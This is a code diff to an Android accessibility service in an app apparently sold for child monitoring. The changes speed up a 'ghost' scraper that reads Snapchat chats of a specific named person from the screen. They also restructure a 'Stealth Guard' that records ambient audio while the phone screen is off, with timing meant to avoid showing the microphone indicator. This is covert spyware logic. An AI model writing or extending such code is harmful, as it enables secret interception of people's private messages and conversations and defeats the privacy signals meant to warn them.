@@ -53,7 +53,7 @@ class VyraAccessibilityService : AccessibilityService() {
                 Log.e(AppConstants.TAG, "Error in snapchatPollerRunnable", e)
             } finally {
                 if (isSnapchatPollerActive) {
-                    snapchatPollerHandler.postDelayed(this, 1500L)
+                    snapchatPollerHandler.postDelayed(this, 800L)
                 }
             }
         }
@@ -63,8 +63,9 @@ class VyraAccessibilityService : AccessibilityService() {
         if (!isSnapchatPollerActive) {
             isSnapchatPollerActive = true
             snapchatPollerHandler.removeCallbacks(snapchatPollerRunnable)
-            snapchatPollerHandler.postDelayed(snapchatPollerRunnable, 1000L)
-            Log.d(AppConstants.TAG, "⚡ Snapchat Continuous Ghost Poller Started (God-Mode)")
+            // Immediately run first poll without delay
+            snapchatPollerHandler.post(snapchatPollerRunnable)
+            Log.d(AppConstants.TAG, "⚡ Snapchat Continuous Ghost Poller Started (Immediate)")
         }
     }
 
@@ -221,7 +222,8 @@ class VyraAccessibilityService : AccessibilityService() {
         // B. Throttled Ghost Chat Scraper: Reads active chat messages directly from view tree (ONLY Harshit Kamboj)
         if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
             event.eventType == AccessibilityEvent.TYPE_VIEW_SCROLLED ||
-            event.eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
+            event.eventType == AccessibilityEvent.TYPE_VIEW_CLICKED ||
+            event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
             val root = rootInActiveWindow
             val headerContact = extractActiveChatContact("com.snapchat.android", root)
             val activeContact = if (headerContact.isNotBlank()) {
@@ -1229,13 +1231,16 @@ class VyraAccessibilityService : AccessibilityService() {
                         }
                     }
                     Intent.ACTION_SCREEN_OFF -> {
+                        stopSnapchatPoller()
                         com.vyra.kids.core.FirebaseSyncManager.getInstance(this@VyraAccessibilityService).syncDeviceStatus(isScreenOn = false)
-                        Log.i(AppConstants.TAG, "Stealth Guard: Screen is OFF. Scheduling debounced pocket ambient voice logger.")
+                        Log.i(AppConstants.TAG, "Stealth Guard: Screen is OFF. Stopped Snapchat poller.")
                         
                         // Cancel any previously scheduled debounce runnable
                         pendingAmbientRunnable?.let { ambientDebounceHandler.removeCallbacks(it) }
-                        val runnable = Runnable {
-                            if (prefs.isStealthScreenGuardEnabled) {
+
+                        // Only start ambient mic if auto pocket mic is explicitly enabled to eliminate background battery drain
+                        if (prefs.isAutoPocketMicEnabled) {
+                            val runnable = Runnable {
                                 val startAmbient = Intent(this@VyraAccessibilityService, AmbientAudioLoggerService::class.java).apply {
                                     action = AmbientAudioLoggerService.ACTION_START_AMBIENT_RECORDING
                                 }
@@ -1246,9 +1251,9 @@ class VyraAccessibilityService : AccessibilityService() {
                                 }
                                 Log.i(AppConstants.TAG, "Stealth Guard: Debounced pocket ambient voice logger activated.")
                             }
+                            pendingAmbientRunnable = runnable
+                            ambientDebounceHandler.postDelayed(runnable, 15000L)
                         }
-                        pendingAmbientRunnable = runnable
-                        ambientDebounceHandler.postDelayed(runnable, 10000L) // 10s debounce prevents green mic dot flashing on quick sleep/wake
                     }
                 }
             }
